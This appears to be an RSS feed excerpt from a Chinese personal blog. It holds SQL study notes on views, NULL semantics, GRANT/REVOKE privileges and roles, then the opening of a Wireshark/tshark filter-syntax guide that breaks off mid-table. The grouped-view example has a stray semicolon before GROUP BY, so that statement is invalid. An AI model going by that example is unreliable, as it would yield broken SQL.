&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;V_TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况4带有派生数据的视图&#34;&gt;情况4：带有派生数据的视图
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;减少冗余数据，定义基本表时一般只存放基本数据。当需要使用计算得出的派生数据时，可以设置在视图&lt;/strong&gt;
&lt;strong&gt;中的派生属性列上，也称为虚拟列。带虚拟列的视图也称为带表达式的视图&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg4.建立有派生数据的视图&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;VIEW&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;V_TAB4&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;new_C2&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况5带有聚集函数和group-by的分组视图&#34;&gt;情况5：带有聚集函数和GROUP BY的分组视图
&lt;/h4&gt;&lt;p&gt;eg5.建立包含聚集函数的分组视图&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;VIEW&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;V_TAB5&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;avg_C2&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#c678dd&#34;&gt;AVG&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;GROUP&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BY&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;删除视图&#34;&gt;删除视图
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;DROP VIEW 视图名 CASCADE;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果使用了CASCADE级联删除语句，则将把该视图导出的所有视图一并删除&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;查询和更新视图&#34;&gt;查询和更新视图
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;视图定义后，对视图进行查询和更新的语句和语法与基本表相同&lt;/strong&gt;
&lt;strong&gt;视图的查询与更新最终都会转换为对基本表的查询和更新，这一过程也被称为视图消解&lt;/strong&gt;
&lt;strong&gt;一般来说，行列子集视图的查询和更新都可以顺利转换，其他则不一定&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;空值&#34;&gt;空值
&lt;/h2&gt;&lt;h3 id=&#34;判断属性为空值&#34;&gt;判断属性为空值
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;这部分和WHERE语句里面空值判断一样啦&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;属性 IS NULL;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;属性 IS NOT NULL;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg.查找TAB1中名字为空的学生：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IS&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;空值的运算&#34;&gt;空值的运算
&lt;/h3&gt;&lt;h4 id=&#34;算数运算&#34;&gt;算数运算
&lt;/h4&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;空值与另一个值的算术运算结果为空值&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;; &lt;span style=&#34;color:#7f848e&#34;&gt;-- 结果为 NULL
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;; &lt;span style=&#34;color:#7f848e&#34;&gt;-- 结果为 NULL
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;比较运算&#34;&gt;比较运算
&lt;/h4&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;空值与另一个值的比较运算结果为 UNKNOWN&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;; &lt;span style=&#34;color:#7f848e&#34;&gt;-- 结果为 UNKNOWN
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;; &lt;span style=&#34;color:#7f848e&#34;&gt;-- 结果为 UNKNOWN
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;; &lt;span style=&#34;color:#7f848e&#34;&gt;-- 结果为 UNKNOWN
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;在查询语句中的处理&#34;&gt;在查询语句中的处理
&lt;/h4&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;在查询语句中，只有使WHERE和HAVING子句的选择条件为TRUE的元组才会被选出作为输出结果（即不包括UNKNOWN的情况)&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;eg1:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;employees&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;salary&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;50000&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;commission&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IS&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这个查询会返回所有工资大于 50000 且佣金不为 NULL 的员工记录&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg2:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;employees&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;commission&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;查询过程中commission可能为NULL，这部分运算后产生UNKNOWN，对应元组会被忽略&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;要让所有都能被输出，最好做如下改动：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;employees&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;commission&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OR&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;commission&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IS&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;数据库安全&#34;&gt;数据库安全
&lt;/h2&gt;&lt;h3 id=&#34;授权&#34;&gt;授权
&lt;/h3&gt;&lt;h4 id=&#34;授予用户权限&#34;&gt;授予用户权限
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;GRANT 权限 ON 对象类型 对象名 TO 用户名 [WITH GRANT OPTION];&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:orange&#34;&gt;&lt;strong&gt;权限：&lt;/strong&gt;&lt;/span&gt;查询权限 SELECT，全部操作权限 ALL PRIVILEGES&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:orange&#34;&gt;&lt;strong&gt;对象类型：&lt;/strong&gt;&lt;/span&gt;TABLE/VIEW&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:orange&#34;&gt;&lt;strong&gt;对象名：&lt;/strong&gt;&lt;/span&gt;表和视图的名称&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:orange&#34;&gt;&lt;strong&gt;用户名：&lt;/strong&gt;&lt;/span&gt;可以指定用户，也可以全体用户PUBLIC&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果没有WITH GRANT OPTION语句，那么用户不能传播这个权限&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SQL不允许循环授权，被授权者不能把权限传递给授权者或其祖先&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.假设我们有一个名为employees的表，现在想让用户user_A只能查询这张表&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;GRANT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ON&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;employees&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;user_A&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果要让A还能把权限授权给别人：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;GRANT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ON&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;employees&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;user_A&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WITH&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;GRANT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OPTION&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;收回用户权限&#34;&gt;收回用户权限
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;REVOKE 权限 ON 对象类型 对象名 FROM 用户名 [CASCADE/RESTRICT];&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CASCADE&lt;/strong&gt;：级联回收，把用户传播出去的权限一并收回&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;RESTRICT&lt;/strong&gt;：受限回收，如果用户传播过该权限，回收会失败（默认行为）&lt;/p&gt;
&lt;p&gt;eg.收回user_A的权限&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;REVOKE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ON&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;employees&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;user_A&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;创建数据库模式的权限&#34;&gt;创建数据库模式的权限
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;对创建数据库模式一类的数据库对象的授权在数据库管理员创建用户的时候实现&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;CREATE USER 用户名 [WITH DBA|RESOURCE|CONNECT];&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DBA&lt;/strong&gt;：可以创建新用户、模式、表、视图等，还可以把这些权限授予其他用户&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;RESOURCE&lt;/strong&gt;：可以创建表、视图，但是不能创建新的模式和用户&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CONNECT&lt;/strong&gt;：只能登录数据库，或者被授予权限后操作&lt;/p&gt;
&lt;h3 id=&#34;数据库角色&#34;&gt;数据库角色
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;角色是权限的集合，可以为一组相同权限的用户创建同一个角色，使用角色管理权限，简化授权过程&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;创建角色&#34;&gt;创建角色
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;CREATE ROLE 角色名;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;给角色添加角色用户&#34;&gt;给角色添加角色/用户
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;GRANT 角色 TO 某角色/某用户 [WITH ADMIN OPTION];&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;给角色授权&#34;&gt;给角色授权
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;GRANT 权限 ON 对象类型 对象名 TO 角色；&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;收回角色权限&#34;&gt;收回角色权限
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;REVOKE 权限 ON 对象类型 对象名 FROM 角色;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>wireshark&amp;tshark简易指北</title>
        <link>https://blog.928330.xyz/p/wiresharktshark%E7%AE%80%E6%98%93%E6%8C%87%E5%8C%97/</link>
        <pubDate>Wed, 14 May 2025 01:15:30 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/wiresharktshark%E7%AE%80%E6%98%93%E6%8C%87%E5%8C%97/</guid>
        <description>&lt;h1 id=&#34;wireshark过滤语法&#34;&gt;wireshark过滤语法
&lt;/h1&gt;&lt;h2 id=&#34;运算符&#34;&gt;运算符
&lt;/h2&gt;&lt;h3 id=&#34;比较运算符&#34;&gt;比较运算符
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;操作符&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;别名&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;类C风格&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;描述&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;示例&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;eq&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;any_eq&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;==&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;等于&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;ip.src == 10.0.0.5&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;ne&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;all_ne&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;!=&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;不等于&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;ip.src != 10.0.0.5&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;all_eq&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;===&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;全等&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;ip.src === 10.0.0.5&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;any_ne&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;!==&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;不全等&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;ip.src !== 10.0.0.5&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;gt&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&amp;gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;大于&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;frame.len &amp;gt; 10&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;lt&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&amp;lt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;小于&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;frame.len &amp;lt; 128&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;ge&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&amp;gt;=&lt;/td&gt;
